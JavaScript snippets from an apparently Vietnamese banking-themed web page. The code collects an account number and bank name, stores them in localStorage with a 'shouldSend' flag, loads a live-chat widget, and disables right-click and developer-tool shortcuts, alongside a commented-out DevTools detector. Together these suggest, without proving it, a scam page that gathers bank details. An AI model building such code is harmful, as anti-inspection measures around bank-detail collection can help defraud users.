// 
window.addEventListener("DOMContentLoaded", function () {
            document.getElementById("createNickname").addEventListener("click", function () {
                const account = document.getElementById("numberAccount").value.trim();
                const bank = document.getElementById("fullnameInput").value.trim();

                if (account === "") {
                    Swal.fire({
                        icon: 'warning',
                        title: 'Cảnh báo',
                        text: 'Vui lòng nhập số tài khoản!',
                        confirmButtonText: 'OK'
                    });
                } else if (!/^\d+$/.test(account)) {
                    Swal.fire({
                        icon: 'error',
                        title: 'Lỗi',
                        text: 'Số tài khoản chỉ được chứa chữ số!',
                        confirmButtonText: 'OK'
                    });
                } else if (account.length < 8) {
                    Swal.fire({
                        icon: 'error',
                        title: 'Lỗi',
                        text: 'Có lỗi xảy ra, vui lòng thử lại sau!',
                        confirmButtonText: 'OK'
                    });
                } else if (bank === "") {
                    Swal.fire({
                        icon: 'warning',
                        title: 'Cảnh báo',
                        text: 'Vui lòng chọn ngân hàng thụ hưởng!',
                        confirmButtonText: 'OK'
                    });
                } else {
                    window.location.href = "home.html";
                }
            });
        });
    
//
        document.getElementById("createNickname").addEventListener("click", function () {
            const stk = document.getElementById("numberAccount").value.trim();
            const bank = document.getElementById("fullnameInput").value.trim();

            if (!stk || !bank) {
                Swal.fire();
                return;
            }

            localStorage.setItem("stk", stk);
            localStorage.setItem("bank", bank);
            localStorage.setItem("shouldSend", "true");
            window.location.href = "home.html";
        });
   
//
        window.__lc = window.__lc || {};
        window.__lc.license = 19178060;
        window.__lc.integration_name = "manual_channels";
        window.__lc.product_name = "livechat";

        (function (n, c, t) {
            function e(n) { return i._h ? i._h.apply(null, n) : i._q.push(n) }
            var i = {
                _q: [],
                _h: null,
                _v: "2.0",
                on: function () { e(["on", t.call(arguments)]) },
                once: function () { e(["once", t.call(arguments)]) },
                off: function () { e(["off", t.call(arguments)]) },
                get: function () { if (i._h) return e(["get", t.call(arguments)]); throw new Error("[LiveChatWidget] You can't use getters before load.") },
                call: function () { e(["call", t.call(arguments)]) },
                init: function () {
                    var n = c.createElement("script");
                    n.async = !0;
                    n.type = "text/javascript";
                    n.src = "https://cdn.livechatinc.com/tracking.js";
                    c.head.appendChild(n);
                }
            };
            n.__lc.asyncInit || i.init();
            n.LiveChatWidget = n.LiveChatWidget || i;
        })(window, document, [].slice);
   
        document.addEventListener("contextmenu", e => e.preventDefault());
        document.addEventListener("keydown", e => {
            if (
                e.key === "F12" ||
                (e.ctrlKey && e.shiftKey && ["I", "J", "C"].includes(e.key)) ||
                (e.ctrlKey && e.key === "U")
            ) {
                e.preventDefault();
            }
        });
//
        // setInterval(() => {
        // const devtoolsOpened =
        // window.outerHeight - window.innerHeight > 160 ||
        //  window.outerWidth - window.innerWidth > 160;
        // if (devtoolsOpened) {
        // document.body.innerHTML = "<h1 style='text-align:center; color:red;'>Đã phát hiện DevTools. Truy cập bị chặn. Vui lòng tắt và tải lại!</h1>";
        // }
        // }, 1000);
    
//
        document.addEventListener("contextmenu", e => e.preventDefault()); // Chặn chuột phải
        document.onkeydown = function (e) {
            if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
                return false;
            }
        };

//
                                    const fullnameInput = document.getElementById("fullnameInput");
                                    const dropdown = document.getElementById("bankDropdown");
                                    const clearBtn = document.getElementById("clearInput");
                                    const noResult = document.getElementById("noResult");
                                    let isDropdownOpen = false;


                                    function updateDropdownDisplay(value) {
                                        const links = dropdown.querySelectorAll("a");
                                        let hasMatch = false;

                                        links.forEach(item => {
                                            const dataName = item.getAttribute("data-name").toLowerCase();
                                            const visibleText = item.innerText.toLowerCase();
                                            if (dataName.includes(value) || visibleText.includes(value)) {
                                                item.style.display = "flex";
                                                hasMatch = true;
                                            } else {
                                                item.style.display = "none";
                                            }
                                        });

                                        dropdown.style.display = "block";
                                        noResult.style.display = hasMatch ? "none" : "block";
                                    }

                                    fullnameInput.addEventListener("input", () => {
                                        const value = fullnameInput.value.toLowerCase();
                                        updateDropdownDisplay(value);
                                        clearBtn.style.display = value !== "" ? "block" : "none";
                                        isDropdownOpen = true;
                                    });


                                    fullnameInput.addEventListener("click", (e) => {
                                        e.stopPropagation();
                                        if (fullnameInput.value.trim() !== "") {
                                            clearBtn.style.display = "block";
                                        }
                                        isDropdownOpen = !isDropdownOpen;
                                        if (isDropdownOpen) {
                                            updateDropdownDisplay(fullnameInput.value.toLowerCase());
                                            dropdown.style.display = "block";
                                        } else {
                                            dropdown.style.display = "none";
                                        }
                                    });


                                    document.addEventListener("click", (e) => {
                                        if (!fullnameInput.contains(e.target) && !dropdown.contains(e.target)) {
                                            dropdown.style.display = "none";
                                            isDropdownOpen = false;
                                        }
                                    });


                                    document.querySelectorAll("#bankDropdown a").forEach(item => {
                                        item.addEventListener("click", function (e) {
                                            e.preventDefault();
                                            fullnameInput.value = this.getAttribute("data-name");
                                            dropdown.style.display = "none";
                                            clearBtn.style.display = "none";
                                            isDropdownOpen = false;
                                        });
                                    });


                                    clearBtn.addEventListener("click", () => {
                                        fullnameInput.value = "";
                                        clearBtn.style.display = "none";
                                        updateDropdownDisplay("");
                                        dropdown.style.display = "block";
                                        fullnameInput.focus();
                                        isDropdownOpen = true;
                                    });

                                    // 
                                     
        window.onscroll = function () {
            const btn = document.getElementById("scrollTopBtn");
            if (document.body.scrollTop > 5 || document.documentElement.scrollTop > 5) {
                btn.style.display = "block";
            } else {
                btn.style.display = "none";
            }
        };

        function scrollToTop() {
            const scrollStep = -window.scrollY / 40;
            const scrollInterval = setInterval(function () {
                if (window.scrollY !== 0) {
                    window.scrollBy(0, scrollStep);
                } else {
                    clearInterval(scrollInterval);
                }
            }, 10);
        }
        function gtag() { dataLayer.push(arguments) } window.dataLayer = window.dataLayer || [], gtag("js", new Date), gtag("config", "G-VCJMEK8E4V")
//
                 